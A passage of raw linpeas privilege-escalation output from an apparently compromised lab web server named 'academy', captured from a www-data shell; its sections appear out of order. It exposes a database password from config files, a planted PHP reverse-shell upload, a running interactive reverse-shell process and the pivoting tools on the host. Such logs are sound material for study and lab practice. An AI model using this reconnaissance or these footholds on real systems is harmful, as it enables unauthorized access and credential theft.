-rw-r--r-- 1 root root 3526 Apr 18  2019 /etc/skel/.bashrc
-rw-r--r-- 1 root root 807 Apr 18  2019 /etc/skel/.profile
-rw-r--r-- 1 grimmie administrator 3526 May 29  2021 /home/grimmie/.bashrc
-rw-r--r-- 1 grimmie administrator 807 May 29  2021 /home/grimmie/.profile
-rw-r--r-- 1 root root 2778 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc
-rw-r--r-- 1 root root 802 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc
-rw-r--r-- 1 root root 570 Jan 31  2010 /usr/share/base-files/dot.bashrc

[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
   139266      4 -rw-r--r--   1 grimmie  administrator      220 May 29  2021 /home/grimmie/.bash_logout                                                        
   270249      4 -rw-r--r--   1 root     root               240 Oct 15  2020 /usr/share/phpmyadmin/vendor/paragonie/constant_time_encoding/.travis.yml
   270133      4 -rw-r--r--   1 root     root               250 Oct 15  2020 /usr/share/phpmyadmin/vendor/bacon/bacon-qr-code/.travis.yml
   389530      4 -rw-r--r--   1 root     root               946 Oct 15  2020 /usr/share/phpmyadmin/vendor/pragmarx/google2fa/.scrutinizer.yml
   389531      4 -rw-r--r--   1 root     root               706 Oct 15  2020 /usr/share/phpmyadmin/vendor/pragmarx/google2fa/.travis.yml
   140294      4 -rw-r--r--   1 root     root               608 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/extensions/.travis.yml
   140341      4 -rw-r--r--   1 root     root              1004 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.travis.yml
   140340      4 -rw-r--r--   1 root     root               799 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.php_cs.dist
   140339      4 -rw-r--r--   1 root     root               224 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.editorconfig
   270226      4 -rw-r--r--   1 root     root               633 Oct 15  2020 /usr/share/phpmyadmin/vendor/google/recaptcha/.travis.yml
   138381      0 -rw-r--r--   1 root     root                 0 Nov 15  2018 /usr/share/dictionaries-common/site-elisp/.nosearch
    12136      0 -rw-r--r--   1 root     root                 0 Jul 29  2023 /run/network/.ifstate.lock
   260079      0 -rw-------   1 root     root                 0 May 29  2021 /etc/.pwd.lock
   259843      4 -rw-r--r--   1 root     root               220 Apr 18  2019 /etc/skel/.bash_logout

[+] Readable files inside /tmp, /var/tmp, /var/backups(limit 100)
-rwxrwxrwx 1 www-data www-data 134167 Jul 29 06:32 /tmp/linpeas.sh                                                                                             
-rw-r--r-- 1 root root 11996 May 29  2021 /var/backups/apt.extended_states.0

[+] Interesting writable Files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                                 
/dev/mqueue                                                                                                                                                    
/dev/mqueue/linpeas.txt
/dev/shm
/run/lock
/run/lock/apache2
/sys/kernel/security/apparmor/.access
/sys/kernel/security/apparmor/.load
/sys/kernel/security/apparmor/.remove
/sys/kernel/security/apparmor/.replace
/tmp
/tmp/linpeas.sh
/var/cache/apache2/mod_cache_disk
/var/lib/php/sessions
/var/lib/phpmyadmin
/var/lib/phpmyadmin/tmp
/var/lib/phpmyadmin/tmp/twig
/var/lib/phpmyadmin/tmp/twig/15
/var/lib/phpmyadmin/tmp/twig/15/15a885ca9738e5a84084a3e52f1f6b23c771ea4f7bdca01081f7b87d3b86a6f9.php
/var/lib/phpmyadmin/tmp/twig/21
/var/lib/phpmyadmin/tmp/twig/21/21a3bee2bc40466295b888b9fec6fb9d77882a7cf061fd3f3d7194b5d54ab837.php
/var/lib/phpmyadmin/tmp/twig/22
/var/lib/phpmyadmin/tmp/twig/22/22f328e86274b51eb9034592ac106d133734cc8f4fba3637fe76b0a4b958f16d.php
/var/lib/phpmyadmin/tmp/twig/28
/var/lib/phpmyadmin/tmp/twig/28/28bcfd31671cb4e1cff7084a80ef5574315cd27a4f33c530bc9ae8da8934caf6.php
/var/lib/phpmyadmin/tmp/twig/2e
/var/lib/phpmyadmin/tmp/twig/2e/2e6ed961bffa8943f6419f806fe7bfc2232df52e39c5880878e7f34aae869dd9.php
/var/lib/phpmyadmin/tmp/twig/31
/var/lib/phpmyadmin/tmp/twig/31/317c8816ee34910f2c19f0c2bd6f261441aea2562acc0463975f80a4f0ed98a9.php
/var/lib/phpmyadmin/tmp/twig/36
/var/lib/phpmyadmin/tmp/twig/36/360a7a01227c90acf0a097d75488841f91dc2939cebca8ee28845b8abccb62ee.php
/var/lib/phpmyadmin/tmp/twig/3b
/var/lib/phpmyadmin/tmp/twig/3b/3bf8a6b93e8c4961d320a65db6c6f551428da6ae8b8e0c87200629b4ddad332d.php
/var/lib/phpmyadmin/tmp/twig/41
/var/lib/phpmyadmin/tmp/twig/41/4161342482a4d1436d31f5619bbdbd176c50e500207e3f364662f5ba8210fe31.php
/var/lib/phpmyadmin/tmp/twig/42
/var/lib/phpmyadmin/tmp/twig/42/426cadcf834dab31a9c871f8a7c8eafa83f4c66a2297cfefa7aae7a7895fa955.php
/var/lib/phpmyadmin/tmp/twig/43
/var/lib/phpmyadmin/tmp/twig/43/43cb8c5a42f17f780372a6d8b976cafccd1f95b8656d9d9638fca2bb2c0c1ee6.php
/var/lib/phpmyadmin/tmp/twig/4c
/var/lib/phpmyadmin/tmp/twig/4c/4c13e8023eae0535704510f289140d5447e25e2dea14eaef5988afa2ae915cb9.php
/var/lib/phpmyadmin/tmp/twig/4e
/var/lib/phpmyadmin/tmp/twig/4e/4e68050e4aec7ca6cfa1665dd465a55a5d643fca6abb104a310e5145d7310851.php
/var/lib/phpmyadmin/tmp/twig/4e/4e8f70ab052f0a5513536d20f156e0649e1791c083804a629624d2cb1e052f1f.php
/var/lib/phpmyadmin/tmp/twig/4f
/var/lib/phpmyadmin/tmp/twig/4f/4f7c1ace051b6b8cb85528aa8aef0052b72277f654cb4f13f2fc063f8529efe4.php
/var/lib/phpmyadmin/tmp/twig/53
/var/lib/phpmyadmin/tmp/twig/53/53ec6cf1deb6f8f805eb3077b06e6ef3b7805e25082d74c09563f91a11c1dfcd.php
/var/lib/phpmyadmin/tmp/twig/5c
/var/lib/phpmyadmin/tmp/twig/5c/5cf13d5a4ba7434d92bc44defee51a93cfbafa0d7984fcb8cbea606d97fe3e1a.php
/var/lib/phpmyadmin/tmp/twig/61
/var/lib/phpmyadmin/tmp/twig/61/61cf92e037fb131bad1ea24485b8e2ab7f0dd05dbe0bcdec85d8a96c80458223.php
/var/lib/phpmyadmin/tmp/twig/6b
/var/lib/phpmyadmin/tmp/twig/6b/6b8deef855b316d17c87795aebdf5aa33b55fae3e6c453d2a5bab7c4085f85d7.php
/var/lib/phpmyadmin/tmp/twig/6c
/var/lib/phpmyadmin/tmp/twig/6c/6c9a7cd11578d393beebc51daa9a48d35c8b03d3a69fd786c55ceedf71a62d29.php
/var/lib/phpmyadmin/tmp/twig/73
/var/lib/phpmyadmin/tmp/twig/73/73a22388ea06dda0a2e91e156573fc4c47961ae6e35817742bb6901eb91d5478.php
/var/lib/phpmyadmin/tmp/twig/73/73ee99e209023ff62597f3f6e5f027a498c1261e4d35d310b0d0a2664f3c2c0d.php
/var/lib/phpmyadmin/tmp/twig/78
/var/lib/phpmyadmin/tmp/twig/78/786fc5d49e751f699117fbb46b2e5920f5cdae9b5b3e7bb04e39d201b9048164.php
/var/lib/phpmyadmin/tmp/twig/7d
/var/lib/phpmyadmin/tmp/twig/7d/7d8087d41c482579730682151ac3393f13b0506f63d25d3b07db85fcba5cdbeb.php
/var/lib/phpmyadmin/tmp/twig/7f
/var/lib/phpmyadmin/tmp/twig/7f/7f2fea86c14cdbd8cd63e93670d9fef0c3d91595972a398d9aa8d5d919c9aa63.php
/var/lib/phpmyadmin/tmp/twig/8a
/var/lib/phpmyadmin/tmp/twig/8a/8a16ca4dbbd4143d994e5b20d8e1e088f482b5a41bf77d34526b36523fc966d7.php
/var/lib/phpmyadmin/tmp/twig/8b
/var/lib/phpmyadmin/tmp/twig/8b/8b3d6e41c7dc114088cc4febcf99864574a28c46ce39fd02d9577bec9ce900de.php
/var/lib/phpmyadmin/tmp/twig/96
/var/lib/phpmyadmin/tmp/twig/96/96885525f00ce10c76c38335c2cf2e232a709122ae75937b4f2eafcdde7be991.php
/var/lib/phpmyadmin/tmp/twig/97
/var/lib/phpmyadmin/tmp/twig/97/9734627c3841f4edcd6c2b6f193947fc0a7a9a69dd1955f703f4f691af6b45e3.php
/var/lib/phpmyadmin/tmp/twig/99
/var/lib/phpmyadmin/tmp/twig/99/9937763182924ca59c5731a9e6a0d96c77ec0ca5ce3241eec146f7bca0a6a0dc.php
/var/lib/phpmyadmin/tmp/twig/9d
/var/lib/phpmyadmin/tmp/twig/9d/9d254bc0e43f46a8844b012d501626d3acdd42c4a2d2da29c2a5f973f04a04e8.php
/var/lib/phpmyadmin/tmp/twig/9d/9d6c5c59ee895a239eeb5956af299ac0e5eb1a69f8db50be742ff0c61b618944.php
/var/lib/phpmyadmin/tmp/twig/9e
/var/lib/phpmyadmin/tmp/twig/9e/9ed23d78fa40b109fca7524500b40ca83ceec9a3ab64d7c38d780c2acf911588.php
/var/lib/phpmyadmin/tmp/twig/a0
/var/lib/phpmyadmin/tmp/twig/a0/a0c00a54b1bb321f799a5f4507a676b317067ae03b1d45bd13363a544ec066b7.php
/var/lib/phpmyadmin/tmp/twig/a4
/var/lib/phpmyadmin/tmp/twig/a4/a49a944225d69636e60c581e17aaceefffebe40aeb5931afd4aaa3da6a0039b9.php
/var/lib/phpmyadmin/tmp/twig/a7
/var/lib/phpmyadmin/tmp/twig/a7/a7e9ef3e1f57ef5a497ace07803123d1b50decbe0fcb448cc66573db89b48e25.php
/var/lib/phpmyadmin/tmp/twig/ae
/var/lib/phpmyadmin/tmp/twig/ae/ae25b735c0398c0c6a34895cf07f858207e235cf453cadf07a003940bfb9cd05.php
/var/lib/phpmyadmin/tmp/twig/af
/var/lib/phpmyadmin/tmp/twig/af/af668e5234a26d3e85e170b10e3d989c2c0c0679b2e5110d593a80b4f58c6443.php
/var/lib/phpmyadmin/tmp/twig/af/af6dd1f6871b54f086eb95e1abc703a0e92824251df6a715be3d3628d2bd3143.php
/var/lib/phpmyadmin/tmp/twig/af/afa81ff97d2424c5a13db6e43971cb716645566bd8d5c987da242dddf3f79817.php
/var/lib/phpmyadmin/tmp/twig/b6
/var/lib/phpmyadmin/tmp/twig/b6/b6c8adb0e14792534ce716cd3bf1d57bc78d45138e62be7d661d75a5f03edcba.php
/var/lib/phpmyadmin/tmp/twig/c3
/var/lib/phpmyadmin/tmp/twig/c3/c34484a1ece80a38a03398208a02a6c9c564d1fe62351a7d7832d163038d96f4.php
/var/lib/phpmyadmin/tmp/twig/c5
/var/lib/phpmyadmin/tmp/twig/c5/c50d1c67b497a887bc492962a09da599ee6c7283a90f7ea08084a548528db689.php
/var/lib/phpmyadmin/tmp/twig/c7
/var/lib/phpmyadmin/tmp/twig/c7/c70df99bff2eea2f20aba19bbb7b8d5de327cecaedb5dc3d383203f7d3d02ad2.php
/var/lib/phpmyadmin/tmp/twig/ca
/var/lib/phpmyadmin/tmp/twig/ca/ca32544b55a5ebda555ff3c0c89508d6e8e139ef05d8387a14389443c8e0fb49.php
/var/lib/phpmyadmin/tmp/twig/d6
/var/lib/phpmyadmin/tmp/twig/d6/d66c84e71db338af3aae5892c3b61f8d85d8bb63e2040876d5bbb84af484fb41.php
/var/lib/phpmyadmin/tmp/twig/dd
/var/lib/phpmyadmin/tmp/twig/dd/dd1476242f68168118c7ae6fc7223306d6024d66a38b3461e11a72d128eee8c1.php
/var/lib/phpmyadmin/tmp/twig/e8
/var/lib/phpmyadmin/tmp/twig/e8/e8184cd61a18c248ecc7e06a3f33b057e814c3c99a4dd56b7a7da715e1bc2af8.php
/var/lib/phpmyadmin/tmp/twig/e9
/var/lib/phpmyadmin/tmp/twig/e9/e93db45b0ff61ef08308b9a87b60a613c0a93fab9ee661c8271381a01e2fa57a.php
/var/lib/phpmyadmin/tmp/twig/f5
/var/lib/phpmyadmin/tmp/twig/f5/f589c1ad0b7292d669068908a26101f0ae7b5db110ba174ebc5492c80bc08508.php
/var/lib/phpmyadmin/tmp/twig/fa
/var/lib/phpmyadmin/tmp/twig/fa/fa249f377795e48c7d92167e29cef2fc31f50401a0bdbc95ddb51c0aec698b9e.php
/var/tmp
/var/www/html/academy
/var/www/html/academy/admin
/var/www/html/academy/admin/assets
/var/www/html/academy/admin/assets/css
/var/www/html/academy/admin/assets/css/bootstrap.css
/var/www/html/academy/admin/assets/css/font-awesome.css
/var/www/html/academy/admin/assets/css/style.css
/var/www/html/academy/admin/assets/fonts
/var/www/html/academy/admin/assets/fonts/FontAwesome.otf
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.eot
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.svg
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.ttf
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff2
/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.eot
/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.svg
/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.ttf
/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.woff
/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.woff2
/var/www/html/academy/admin/assets/img
/var/www/html/academy/admin/assets/js
/var/www/html/academy/admin/assets/js/bootstrap.js
/var/www/html/academy/admin/assets/js/jquery-1.11.1.js
/var/www/html/academy/admin/change-password.php
/var/www/html/academy/admin/check_availability.php
/var/www/html/academy/admin/course.php
/var/www/html/academy/admin/department.php
/var/www/html/academy/admin/edit-course.php
/var/www/html/academy/admin/enroll-history.php
/var/www/html/academy/admin/includes
/var/www/html/academy/admin/includes/config.php
/var/www/html/academy/admin/includes/footer.php
/var/www/html/academy/admin/includes/header.php
/var/www/html/academy/admin/includes/menubar.php
/var/www/html/academy/admin/index.php
/var/www/html/academy/admin/level.php
/var/www/html/academy/admin/logout.php
/var/www/html/academy/admin/manage-students.php
/var/www/html/academy/admin/print.php
/var/www/html/academy/admin/semester.php
/var/www/html/academy/admin/session.php
/var/www/html/academy/admin/student-registration.php
/var/www/html/academy/admin/user-log.php
/var/www/html/academy/assets
/var/www/html/academy/assets/css
/var/www/html/academy/assets/css/bootstrap.css
/var/www/html/academy/assets/css/font-awesome.css
/var/www/html/academy/assets/css/style.css
/var/www/html/academy/assets/fonts
/var/www/html/academy/assets/fonts/FontAwesome.otf
/var/www/html/academy/assets/fonts/fontawesome-webfont.eot
/var/www/html/academy/assets/fonts/fontawesome-webfont.svg
/var/www/html/academy/assets/fonts/fontawesome-webfont.ttf
/var/www/html/academy/assets/fonts/fontawesome-webfont.woff
/var/www/html/academy/assets/fonts/fontawesome-webfont.woff2
/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.eot
/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.svg
/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.ttf
/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.woff
/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.woff2
/var/www/html/academy/assets/img
/var/www/html/academy/assets/js
/var/www/html/academy/assets/js/bootstrap.js
/var/www/html/academy/assets/js/jquery-1.11.1.js
/var/www/html/academy/change-password.php
/var/www/html/academy/check_availability.php
/var/www/html/academy/db
/var/www/html/academy/db/onlinecourse.sql
/var/www/html/academy/enroll-history.php
/var/www/html/academy/enroll.php
/var/www/html/academy/includes
/var/www/html/academy/includes/config.php
/var/www/html/academy/includes/footer.php
/var/www/html/academy/includes/header.php
/var/www/html/academy/includes/menubar.php
/var/www/html/academy/index.php
/var/www/html/academy/logout.php
/var/www/html/academy/my-profile.php
/var/www/html/academy/pincode-verification.php
/var/www/html/academy/print.php
/var/www/html/academy/studentphoto
/var/www/html/academy/studentphoto/php-rev.php
/tmp/linpeas.sh
/dev/mqueue/linpeas.txt

[+] Searching passwords in config PHP files
$mysql_password = "My_V3ryS3cur3_P4ss";                                                                                                                        
$mysql_password = "My_V3ryS3cur3_P4ss";

[+] Finding IPs inside logs (limit 100)
     44 /var/log/dpkg.log.1:1.8.2.1                                                                                                                            
     24 /var/log/dpkg.log.1:1.8.2.3
     14 /var/log/dpkg.log.1:1.8.4.3
      9 /var/log/wtmp:192.168.10.31
      7 /var/log/dpkg.log.1:7.43.0.2
      7 /var/log/dpkg.log.1:4.8.6.1
      7 /var/log/dpkg.log.1:1.7.3.2
      7 /var/log/dpkg.log.1:0.5.10.2
      7 /var/log/dpkg.log.1:0.19.8.1
      4 /var/log/installer/status:1.2.3.3
      1 /var/log/lastlog:192.168.10.31

[+] Finding passwords inside logs (limit 100)
/var/log/dpkg.log.1:2021-05-29 17:00:10 install base-passwd:amd64 <none> 3.5.46                                                                                
/var/log/dpkg.log.1:2021-05-29 17:00:10 status half-installed base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:11 configure base-passwd:amd64 3.5.46 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:11 status half-configured base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:11 status installed base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:11 status unpacked base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:18 status half-configured base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:18 status half-installed base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:18 status unpacked base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:18 upgrade base-passwd:amd64 3.5.46 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:21 install passwd:amd64 <none> 1:4.5-1.1
/var/log/dpkg.log.1:2021-05-29 17:00:21 status half-installed passwd:amd64 1:4.5-1.1
/var/log/dpkg.log.1:2021-05-29 17:00:21 status unpacked passwd:amd64 1:4.5-1.1
/var/log/dpkg.log.1:2021-05-29 17:00:24 configure base-passwd:amd64 3.5.46 <none>
/var/log/dpkg.log.1:2021-05-29 17:00:24 status half-configured base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:24 status installed base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:24 status unpacked base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:25 configure passwd:amd64 1:4.5-1.1 <none>
/var/log/dpkg.log.1:2021-05-29 17:00:25 status half-configured passwd:amd64 1:4.5-1.1
/var/log/dpkg.log.1:2021-05-29 17:00:25 status installed passwd:amd64 1:4.5-1.1
/var/log/dpkg.log.1:2021-05-29 17:00:25 status unpacked passwd:amd64 1:4.5-1.1
/var/log/installer/status:Description: Set up users and passwords

[+] Finding emails inside logs (limit 100)
      1 /var/log/installer/status:aeb@debian.org                                                                                                               
      1 /var/log/installer/status:anibal@debian.org
      2 /var/log/installer/status:berni@debian.org
     40 /var/log/installer/status:debian-boot@lists.debian.org
     16 /var/log/installer/status:debian-kernel@lists.debian.org
      1 /var/log/installer/status:debian-med-packaging@lists.alioth.debian.org
      1 /var/log/installer/status:debian@jff.email
      1 /var/log/installer/status:djpig@debian.org
      4 /var/log/installer/status:gcs@debian.org
      2 /var/log/installer/status:guillem@debian.org
      1 /var/log/installer/status:guus@debian.org
      1 /var/log/installer/status:linux-xfs@vger.kernel.org
      2 /var/log/installer/status:mmind@debian.org
      1 /var/log/installer/status:open-iscsi@packages.debian.org
      1 /var/log/installer/status:open-isns@packages.debian.org
      1 /var/log/installer/status:packages@release.debian.org
      2 /var/log/installer/status:parted-maintainers@alioth-lists.debian.net
      1 /var/log/installer/status:petere@debian.org
      2 /var/log/installer/status:pkg-gnupg-maint@lists.alioth.debian.org
      1 /var/log/installer/status:pkg-gnutls-maint@lists.alioth.debian.org
      1 /var/log/installer/status:pkg-grub-devel@alioth-lists.debian.net
      1 /var/log/installer/status:pkg-mdadm-devel@lists.alioth.debian.org
      1 /var/log/installer/status:rogershimizu@gmail.com
      2 /var/log/installer/status:team+lvm@tracker.debian.org
      1 /var/log/installer/status:tytso@mit.edu
      1 /var/log/installer/status:wpa@packages.debian.org
      1 /var/log/installer/status:xnox@debian.org

[+] Finding *password* or *credential* files in home
                                                                                                                                                               
[+] Finding 'pwd' or 'passw' string inside /home, /var/www, /etc, /root and list possible web(/var/www) and config(/etc) passwords
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff2                                                                                             
/var/www/html/academy/admin/assets/js/jquery-1.11.1.js
/var/www/html/academy/admin/change-password.php
/var/www/html/academy/admin/includes/config.php
/var/www/html/academy/admin/index.php
/var/www/html/academy/admin/manage-students.php
/var/www/html/academy/admin/student-registration.php
/var/www/html/academy/assets/fonts/fontawesome-webfont.woff2
/var/www/html/academy/assets/js/jquery-1.11.1.js
/var/www/html/academy/change-password.php
/var/www/html/academy/db/onlinecourse.sql
/var/www/html/academy/includes/config.php
/var/www/html/academy/includes/menubar.php
/var/www/html/academy/index.php
/var/www/html/academy/pincode-verification.php
/var/www/html/academy/admin/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";
/var/www/html/academy/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";
/etc/apache2/sites-available/default-ssl.conf:          #        Note that no password is obtained from the user. Every entry in the user
/etc/apache2/sites-available/default-ssl.conf:          #        file needs this password: `xxj31ZMTZzkVA'.
/etc/apparmor.d/abstractions/authentication:  # databases containing passwords, PAM configuration files, PAM libraries
/etc/debconf.conf:Accept-Type: password
/etc/debconf.conf:Filename: /var/cache/debconf/passwords.dat
/etc/debconf.conf:Name: passwords
/etc/debconf.conf:Reject-Type: password
/etc/debconf.conf:Stack: config, passwords
 linpeas v2.2.7 by carlospolop
                                                                                                                                                               
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEYEND:                                                                                                                                                       
  RED/YELLOW: 99% a PE vector
  RED: You must take a look at it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMangenta: Your username


====================================( Basic information )=====================================
OS: Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)                  
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: academy
Writable folder: /dev/shm
[+] /usr/bin/ping is available for network discovery (You can use linpeas to discover hosts, learn more with -h)
[+] /usr/bin/nc is available for network discover & port scanning (You can use linpeas to discover hosts/port scanning, learn more with -h)                    
                                                                                                                                                               

====================================( System Information )====================================
[+] Operative system                                                                                                                                           
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                                                                
Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)                      
Distributor ID: Debian
Description:    Debian GNU/Linux 10 (buster)
Release:        10
Codename:       buster

[+] Sudo version
sudo Not Found                                                                                                                                                 
                                                                                                                                                               
[+] PATH
[i] Any writable folder in original PATH? (a new completed path will be exported)                                                                              
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                   
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

[+] Date
Sat Jul 29 06:37:17 EDT 2023                                                                                                                                   

[+] System stats
Filesystem      Size  Used Avail Use% Mounted on                                                                                                               
/dev/sda1       6.9G  1.9G  4.7G  29% /
udev            479M     0  479M   0% /dev
tmpfs           494M     0  494M   0% /dev/shm
tmpfs            99M  4.3M   95M   5% /run
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           494M     0  494M   0% /sys/fs/cgroup
tmpfs            99M     0   99M   0% /run/user/0
              total        used        free      shared  buff/cache   available
Mem:        1009960      178916      474532       10816      356512      640884
Swap:        998396           0      998396

[+] Environment
[i] Any private information inside environment variables?                                                                                                      
HISTFILESIZE=0                                                                                                                                                 
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
JOURNAL_STREAM=9:13967
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
INVOCATION_ID=d29a7dcbdfb3443ebe10d76ee30417d9
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
HISTSIZE=0
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
HISTFILE=/dev/null

[+] Looking for Signature verification failed in dmseg
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] selinux enabled? .......... sestatus Not Found
[+] Printer? .......... lpstat Not Found                                                                                                                       
[+] Is this a container? .......... No                                                                                                                         
[+] Is ASLR enabled? .......... Yes                                                                                                                            

=========================================( Devices )==========================================
[+] Any sd* disk in /dev? (limit 20)                                                                                                                           
sda                                                                                                                                                            
sda1
sda2
sda5

[+] Unmounted file-system?
[i] Check if you can mount umounted devices                                                                                                                    
UUID=24d0cea7-c37b-4fd6-838e-d05cfb61a601 /               ext4    errors=remount-ro 0       1                                                                  
UUID=930c51cc-089d-42bd-8e30-f08b86c52dca none            swap    sw              0       0
/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0


====================================( Available Software )====================================
[+] Useful software?                                                                                                                                           
/usr/bin/nc                                                                                                                                                    
/usr/bin/netcat
/usr/bin/nc.traditional
/usr/bin/wget
/usr/bin/ping
/usr/bin/base64
/usr/bin/socat
/usr/bin/python
/usr/bin/python2
/usr/bin/python3
/usr/bin/python2.7
/usr/bin/python3.7
/usr/bin/perl
/usr/bin/php

[+] Installed compilers?
Compilers Not Found                                                                                                                                            
                                                                                                                                                               

================================( Processes, Cron & Services )================================
[+] Cleaned processes                                                                                                                                          
[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                       
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND                                                                                       
root         1  0.0  0.9 103796  9972 ?        Ss   05:18   0:01 /sbin/init
root       324  0.0  0.7  40376  7976 ?        Ss   05:18   0:00 /lib/systemd/systemd-journald
root       349  0.0  0.4  21932  4952 ?        Ss   05:18   0:00 /lib/systemd/systemd-udevd
systemd+   434  0.0  0.6  93084  6556 ?        Ssl  05:18   0:00 /lib/systemd/systemd-timesyncd
root       465  0.0  0.2   8504  2736 ?        Ss   05:18   0:00 /usr/sbin/cron -f
root       470  0.0  0.7  19492  7244 ?        Ss   05:18   0:00 /lib/systemd/systemd-logind
message+   472  0.0  0.4   8980  4348 ?        Ss   05:18   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       473  0.0  0.4 225824  4332 ?        Ssl  05:18   0:00 /usr/sbin/rsyslogd -n -iNONE
root       475  0.0  0.2   6620  2808 ?        Ss   05:18   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
root       477  0.0  0.3   6924  3376 tty1     Ss   05:18   0:00 /bin/login -p --
root       486  0.0  0.6  15852  6876 ?        Ss   05:18   0:00 /usr/sbin/sshd -D
root       521  0.0  2.2 214992 23008 ?        Ss   05:18   0:00 /usr/sbin/apache2 -k start
mysql      541  0.0  8.9 1274452 90652 ?       Ssl  05:18   0:03 /usr/sbin/mysqld
www-data   544  0.0  1.2 215348 13032 ?        S    05:18   0:00 /usr/sbin/apache2 -k start
root       634  0.0  0.8  21024  8488 ?        Ss   05:18   0:00 /lib/systemd/systemd --user
root       635  0.0  0.2  22832  2264 ?        S    05:18   0:00 (sd-pam)
root       639  0.0  0.4   7652  4444 tty1     S+   05:18   0:00 -bash
root       643  0.0  0.5   9488  5592 ?        Ss   05:18   0:00 dhclient
root      1051  0.0  0.5   9488  5688 ?        Ss   06:07   0:00 dhclient
www-data  1075  0.0  1.2 215340 13024 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1128  0.0  1.6 215340 17168 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1129  0.0  1.9 215460 19852 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1137  0.0  1.9 215460 19540 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1147  0.0  1.9 215460 19652 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1151  0.0  2.3 218640 23700 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1157  0.0  1.2 215348 12772 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1163  0.0  1.2 215340 12756 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1172  0.0  1.9 215576 19836 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1583  0.0  0.0   2388   756 ?        S    06:33   0:00 sh -c uname -a; w; id; /bin/sh -i
www-data  1587  0.0  0.0   2388   752 ?        S    06:33   0:00 /bin/sh -i
www-data  1624  1.0  0.1   2520  1628 ?        S    06:37   0:00 /bin/sh ./linpeas.sh
www-data  1805  0.0  0.2   7640  2728 ?        R    06:37   0:00 ps aux

[+] Binary processes permissions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                      
 56K -rwxr-xr-x 1 root root  56K Jul 27  2018 /bin/login                                                                                                       
   0 lrwxrwxrwx 1 root root    4 May 29  2021 /bin/sh -> dash
1.5M -rwxr-xr-x 1 root root 1.5M Mar 18  2021 /lib/systemd/systemd
